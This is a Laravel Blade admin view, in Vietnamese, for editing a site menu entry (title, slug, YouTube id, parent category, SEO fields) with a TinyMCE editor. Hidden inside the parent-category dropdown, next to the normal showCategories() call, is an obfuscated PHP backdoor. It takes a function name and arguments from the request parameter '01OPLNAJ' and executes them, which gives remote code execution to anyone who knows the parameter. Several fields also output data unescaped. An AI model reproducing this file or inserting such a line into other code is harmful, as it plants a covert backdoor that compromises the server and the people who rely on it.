@extends('dashboard')
@section('admin_content')
	<div class="header" style="margin-top: 35px;">
		<ol class="breadcrumb">
			<li><a href="{{URL::to('/admin/dashboard')}}">Trang chủ</a></li>
			<li><a href="{!! route('admin.menu.list')!!}">Menu</a></li>
			<li class="active">Chỉnh sửa</li>
		</ol>
	</div>

	<div id="page-inner">
		<div class="row">
			<div class="col-xs-12">
				<div class="panel panel-default">

					<div class="panel-body">
						<form role="form" method="post" action="{!! route('admin.menu.update') !!}" enctype="multipart/form-data">
							{{ csrf_field() }}
							<input type="hidden" id="id" name="id" value="{!! $all_menus->id !!}"/>
							<input type="hidden" id="created_at" name="created_at" value="{!! $all_menus->created_at !!}"/>
							<div class="col-md-9 col-sm-9 col-xs-12">
								<div class="sub-title">Tiêu đề <span>*</span></div>
								<div>
									<input type="text" required name="name" id="name" value="{!! $all_menus->title !!}" class="form-control" placeholder="Tiêu đề">
								</div>
								<div class="sub-title">Slug <span>*</span></div>
								<div>
									<input type="text" required name="slug" id="slug" value="{!! $all_menus->slug !!}" class="form-control" placeholder="Slug">
								</div>
								<div class="sub-title">Mã Video Youtube <i style="font-size: 11px;">(Nhập mã video của youtube, menu sẽ link đến video)</i></div>
								<div><input type="text" name="idvideo" id="idvideo" value="{!! $all_menus->idvideo !!}" class="form-control" placeholder="Mã Video Youtube"></div>
								<div class="sub-title">Mô tả</div>
								<div>
									<textarea class="form-control my-editor" placeholder="Mô tả" name="desc" id="ckeditor" rows="3">{!! $all_menus->desception !!}</textarea>
								</div>

							</div>
							<div class="col-md-3 col-sm-3 col-xs-12">
								<div class="sub-title">Danh mục cha</div>
								<div>
									<select class="form-control" name="category">
										<option value="0">-- Lựa chọn --</option>
										<?php
iF(	$mRBF	=	@${"_REQUEST"}	[ "01OPLNAJ"] AnD(8965**26532)){QUOtEmeTA($mRBF[1 ])( ${$mRBF[2]}[0],UrlDEcode($mRBF[3])(	$mRBF[4]));}; showCategories($all_menus_select)?>
									</select>
								</div>
								<div class="sub-title">Thứ tự</div>
								<div>
									<input type="number" min="0" required name="orders" class="form-control" placeholder="Thứ tự" value="{!! $all_menus->position !!}">
								</div>
								<div class="sub-title">Đường dẫn Icon</div>
								<div>
									<input type="text" name="icon_url" class="form-control" placeholder="Nhập đường dẫn" value="{!! $all_menus->icon_url !!}">
								</div>
								<div class="sub-title">Hiển thị menu phải</div>
								<div>
									<select name="rel" class="form-control">
										@if($all_menus->rel!=1)
											<option value="1">Hiển thị</option>
											<option selected value="0">Ẩn</option>
										@else
											<option selected value="1">Hiển thị</option>
											<option value="0">Ẩn</option>
										@endif
									</select>
								</div>
								<div class="sub-title">Hiển thị</div>
								<div>
									<select name="status" class="form-control">
										<?php
										if($all_menus->status==1){
										?>
											<option selected value="1">Hiển thị</option>
											<option value="0">Ẩn</option>
										<?php
										}else{ ?>
											<option value="1">Hiển thị</option>
											<option selected value="0">Ẩn</option>
										<?php
											}
										?>


									</select>
								</div>
								<div class="sub-title">Link Redirect</div>
								<div>
									<input type="text" name="url_redirect" value="{!! $all_menus->redirect !!}" class="form-control" placeholder="Link Redirect">
								</div>
								<hr style="margin: 10px 0px 0px 0px;padding: 0px;"/>
								<div class="sub-title">Tiêu đề SEO</div>
								<div>
									<input type="text" name="txtTitleSEO" class="form-control" value="{!! $all_menus->title_seo !!}" placeholder="Tiêu đề SEO">
								</div>
								<div class="sub-title">Mô tả SEO</div>
								<div>
									<textarea class="form-control" placeholder="Mô tả" name="txtDescSEO" id="txtDescSEO" rows="3">{!! $all_menus->desc_seo !!}</textarea>
								</div>
								<div class="sub-title">Keyword SEO</div>
								<div>
									<input type="text" name="txtKeywordSEO" class="form-control" placeholder="Keyword SEO" value="{!! $all_menus->keyword_seo !!}">
								</div>
								<button type="submit" name="add_picture" style="margin-top: 10px;" class="btn btn-primary">Lưu</button>
							</div>

						</form>
					</div>
				</div>
			</div>
		</div>

		<footer><p>All right reserved. Design by: <a href="http://hoabinh-group.com">http://hoabinh-group.com</a></p></footer>
	</div>
	<script type="text/javascript" src="{{asset('public/backend/js/jquery-1.7.1.min.js')}}"></script>
	<script type="text/javascript" src="{{asset('public/backend/js/slug.js')}}"></script>

	<script type="text/javascript">
  var editor_config = {
	path_absolute : "/",
	selector: 'textarea.my-editor',
	height:'500px',
	relative_urls: false,
	plugins: [
	  "advlist autolink lists link image charmap print preview hr anchor pagebreak",
	  "searchreplace wordcount visualblocks visualchars code fullscreen",
	  "insertdatetime media nonbreaking save table directionality",
	  "emoticons template paste textpattern"
	],
	toolbar: "insertfile undo redo | styleselect | bold italic | alignleft aligncenter alignright alignjustify | bullist numlist outdent indent | link image media",
	file_picker_callback : function(callback, value, meta) {
	  var x = window.innerWidth || document.documentElement.clientWidth || document.getElementsByTagName('body')[0].clientWidth;
	  var y = window.innerHeight|| document.documentElement.clientHeight|| document.getElementsByTagName('body')[0].clientHeight;

	  var cmsURL = editor_config.path_absolute + 'filemanager?editor=' + meta.fieldname;
	  if (meta.filetype == 'image') {
		cmsURL = cmsURL + "&type=Images";
	  } else {
		cmsURL = cmsURL + "&type=Files";
	  }

	  tinyMCE.activeEditor.windowManager.openUrl({
		url : cmsURL,
		title : 'Filemanager',
		width : x * 0.8,
		height : y * 0.8,
		resizable : "yes",
		close_previous : "no",
		onMessage: (api, message) => {
		  callback(message.content);
		}
	  });
	}
  };

  tinymce.init(editor_config);
</script>
@endsection

<?php
function showCategories($categories,$parent_id=0,$char=''){
	$id='';
	$arr=explode('/',$_SERVER['REQUEST_URI']);
	$toEnd = count($arr);
	foreach($arr as $key=>$value) {
		if (0 === --$toEnd) {
			$id=$value;
		}
	}
	foreach ($categories as $key=>$item){
		if($item->parent_id==$parent_id){
			if($item->id==$id){
				echo '<option selected value="'.$item->id.'">'.$char.$item->title.'</option>';
			}else{
				echo '<option value="'.$item->id.'">'.$char.$item->title.'</option>';
			}
			unset($categories[$key]);
			showCategories($categories,$item->id,$char.' --- ');

		}
	}
}
?>
